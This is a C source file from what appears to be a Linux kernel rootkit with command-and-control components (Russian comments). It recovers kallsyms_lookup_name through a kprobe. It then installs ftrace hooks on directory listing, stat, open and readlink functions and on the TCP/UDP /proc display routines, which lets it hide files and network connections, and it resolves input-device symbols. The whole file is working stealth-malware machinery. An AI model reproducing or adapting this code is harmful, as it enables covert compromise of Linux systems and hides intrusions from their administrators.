#include <linux/kallsyms.h>
#include <linux/ftrace.h>
#include <linux/kprobes.h>

#include "hooks.h"
#include "prototypes.h"
#include "c2/commands/system_info/system_info.h"

struct ftrace_hook {
	const char *name;
	void *function;
	void *original;

	unsigned long address;
	struct ftrace_ops ops;
};

#define SYSCALL_NAME(name) ("__x64_" name)

#define SYS_HOOK(_name, _function, _original) \
	{ \
		.name = SYSCALL_NAME(_name), \
		.function = (_function), \
		.original = (_original), \
	}

#define HOOK(_name, _function, _original) \
	{ \
		.name = (_name), \
		.function = (_function), \
		.original = (_original), \
	}

static struct ftrace_hook EX_hooks[] = {
	// ???
	// fillonedir
	// compat_fillonedir
	// compat_filldir 

	HOOK("filldir64", ex_filldir64, &real_filldir64),
	HOOK("filldir", ex_filldir, &real_filldir),

	HOOK("vfs_statx", ex_vfs_statx, &real_vfs_statx),

#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 6, 0)
	HOOK("do_sys_openat2", ex_do_sys_openat2, &real_do_sys_openat2),
#else
	HOOK("do_sys_open", ex_do_sys_open, &real_do_sys_open),
#endif
	
	HOOK("do_readlinkat", ex_do_readlinkat, &real_do_readlinkat),

	// ??
	// sys_link sys_unlink sys_rename
	//  sys_mkdir sys_rmdir  sys_access 

	// // SYS_HOOK("sys_recvmsg", ex_sys_recvmsg, &real_sys_recvmsg),
	// HOOK("packet_rcv", ex_packet_rcv, &real_packet_rcv),
	// HOOK("packet_rcv_spkt", ex_packet_rcv_spkt, &real_packet_rcv_spkt),
	// HOOK("tpacket_rcv", ex_tpacket_rcv, &real_tpacket_rcv),
	HOOK("tcp4_seq_show", ex_tcp4_seq_show, &real_tcp4_seq_show),
	HOOK("tcp6_seq_show", ex_tcp6_seq_show, &real_tcp6_seq_show),
	HOOK("udp4_seq_show", ex_udp4_seq_show, &real_udp4_seq_show),
	HOOK("udp6_seq_show", ex_udp6_seq_show, &real_udp6_seq_show),
};

static unsigned long (*real_kallsyms_lookup_name)(const char *name);

static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name",
};

static bool get_kallsyms_lookup_name(void) {
	int ret;

    ret = register_kprobe(&kp);
    if (ret < 0) {
        pr_err("register_kprobe failed, returned %d\n", ret);
        return false;
    }
	
	real_kallsyms_lookup_name = (void *) kp.addr;
	unregister_kprobe(&kp);
    return true; 
}

#if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
#define FTRACE_OPS_FL_RECURSION FTRACE_OPS_FL_RECURSION_SAFE
#endif

// #if LINUX_VERSION_CODE < KERNEL_VERSION(5,11,0)
// #define ftrace_regs pt_regs

// static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs)
// {
// 	return fregs;
// }
// #endif

/*
 * 2 метода предотвращения рекурсии:
 * - По адресу возврата функции (USE_FENTRY_OFFSET = 0)
 * - Пропускает вызов ftrace (USE_FENTRY_OFFSET = 1)
 */
#define USE_FENTRY_OFFSET 0

// Отключение оптимизации для корректного обнаружения рекурсии
#if !USE_FENTRY_OFFSET
#pragma GCC optimize("-fno-optimize-sibling-calls")
#endif

static int fh_resolve_hook_address(struct ftrace_hook *hook)
{
	hook->address = real_kallsyms_lookup_name(hook->name);

	if (!hook->address) {
		pr_debug("unresolved symbol: %s\n", hook->name);
		return -ENOENT;
	}

#if USE_FENTRY_OFFSET
	*((unsigned long*) hook->original) = hook->address + MCOUNT_INSN_SIZE;
#else
	*((unsigned long*) hook->original) = hook->address;
#endif

	return 0;
}

static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
		struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
	struct pt_regs *regs = ftrace_get_regs(fregs);
	struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

#if USE_FENTRY_OFFSET
	regs->ip = (unsigned long)hook->function;
#else
	if (!within_module(parent_ip, THIS_MODULE))
		regs->ip = (unsigned long)hook->function;
#endif
}

// Функция установки хука
static int fh_install_hook(struct ftrace_hook *hook)
{
	int err;

	err = fh_resolve_hook_address(hook);
	if (err)
		return err;

	hook->ops.func = fh_ftrace_thunk;
	hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
	                | FTRACE_OPS_FL_RECURSION
	                | FTRACE_OPS_FL_IPMODIFY;

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
		return err;
	}

	err = register_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("register_ftrace_function() failed: %d\n", err);
		ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
		return err;
	}
	
    pr_info("hook install %s\n", hook->name);

	return 0;
}

// Функция удаления хука
static void fh_remove_hook(struct ftrace_hook *hook)
{
	int err;

	err = unregister_ftrace_function(&hook->ops);
	if (err) {
		pr_debug("unregister_ftrace_function() failed: %d\n", err);
	}

	err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
	if (err) {
		pr_debug("ftrace_set_filter_ip() failed: %d\n", err);
	}
}

// вынести повторы
static int get_addr(void) {
	real_getname = (struct filename *(*)(const char __user *))real_kallsyms_lookup_name("getname");
	if (!real_getname) {
		pr_err("Failed to resolve real_getname\n");
		return -ENOENT;
	}
	pr_info("Get addr getname\n");

	real_block_class = (struct class *)real_kallsyms_lookup_name("block_class");
	if (!real_block_class) {
		pr_err("Failed to resolve real_getname\n");
		return -ENOENT;
	}
	pr_info("Get addr block_class\n");

	real_input_dev_list = (struct list_head *)real_kallsyms_lookup_name("input_dev_list");
	if (!real_input_dev_list) {
		pr_err("Failed to resolve real_input_dev_list\n");
		return -ENOENT;
	}
	pr_info("Get addr input_dev_list\n");

	real_input_mutex = (spinlock_t *)real_kallsyms_lookup_name("input_mutex");
	if (!real_input_mutex) {
		pr_err("Failed to resolve real_input_mutex\n");
		return -ENOENT;
	}
	pr_info("Get addr input_mutex\n");

	real_si_swapinfo = (void *)real_kallsyms_lookup_name("si_swapinfo");
	if (!real_si_swapinfo) {
		pr_err("Failed to resolve real_si_swapinfo\n");
		return -ENOENT;
	}
	pr_info("Get addr si_swapinfo\n");

	return 0;
}

// Функция установки хуков
int fh_install_hooks(void)
{
    int err;
	size_t i;

    if (!get_kallsyms_lookup_name()) {
        return -1;
    }

	for (i = 0; i < ARRAY_SIZE(EX_hooks); i++) {
		err = fh_install_hook(&EX_hooks[i]);
		if (err)
			goto error;
	}

	if (get_addr()) {
		goto error;
	}

	return 0;

error:
	while (i != 0) {
		fh_remove_hook(&EX_hooks[--i]);
	}

	return err;
}

// Функция удаления хуков
void fh_remove_hooks(void)
{
	size_t i;

	for (i = 0; i < ARRAY_SIZE(EX_hooks); i++) {
		fh_remove_hook(&EX_hooks[i]);
    }
}
